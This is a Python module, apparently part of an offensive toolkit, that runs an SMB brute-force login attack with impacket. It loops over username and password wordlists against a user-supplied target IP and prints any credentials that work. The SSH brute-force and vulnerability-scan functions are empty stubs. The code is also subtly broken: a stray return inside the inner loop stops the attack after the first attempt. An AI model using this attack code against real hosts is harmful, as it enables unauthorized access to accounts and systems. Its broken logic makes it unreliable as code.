from core.utils import open_file
from core.colors import Colors as cl
from impacket.smbconnection import SMBConnection

def attempt_smb_login(target_ip, username, password):
    try:
        conn = SMBConnection(target_ip, target_ip, sess_port=445, timeout=3)
        conn.login(username, password)
        print(f"{cl.green}[+] SUCCESS: {username}:{password}{cl.reset}")
        conn.close()
        return True
    except Exception as e:
        #print(f"{cl.red}[-] FAILED: {username}:{password} | {str(e)}{cl.reset}")
        return False

def brute_force_smb():
    try:
        print(f"{cl.yellow}[~] SMB Brute Force Attack: Provide the target IP and choose wordlists for usernames and passwords.{cl.reset}")
        target_ip = input(f"{cl.blue}[>] Enter target IP (e.g. 192.168.0.53): {cl.reset}").strip()
        if not target_ip:
            raise Exception("No target IP provided.") 

        user_file_name, user_file_path = open_file()
        print(f"{cl.cyan}[*] Selected username wordlist: {user_file_name}{cl.reset}")
        password_file_name, password_file_path = open_file()
        print(f"{cl.cyan}[*] Selected password wordlist: {password_file_name}{cl.reset}")
        print(f"{cl.cyan}[~] Starting SMB brute-force attack on {target_ip}...{cl.reset}")

        with open(user_file_path, "r") as uf:
            usernames = [line.strip() for line in uf if line.strip()]

        with open(password_file_path, "r") as pf:
            passwords = [line.strip() for line in pf if line.strip()]

        for username in usernames:
            for password in passwords:
                success = attempt_smb_login(target_ip, username, password)
                return
        if success:
            print(f"{cl.yellow}[!] Stopping brute-force. Valid credentials found!{cl.reset}")
        else:
            print(f"{cl.yellow}[!] No valid credentials found!{cl.reset}")

    except Exception as e:
        print(f"{cl.red}[!] Brute force SMB failed: {e}{cl.reset}")

def brute_force_ssh():
    try:
        pass
    except Exception as e:
        print(f"{cl.red}[!] Brute force SSH failed: {e}{cl.reset}")

def scan_vulnerabilities():
    try:
        pass
    except Exception as e:
        print(f"{cl.red}[!] Error scanning for vulberabilities failed: {e}{cl.reset}")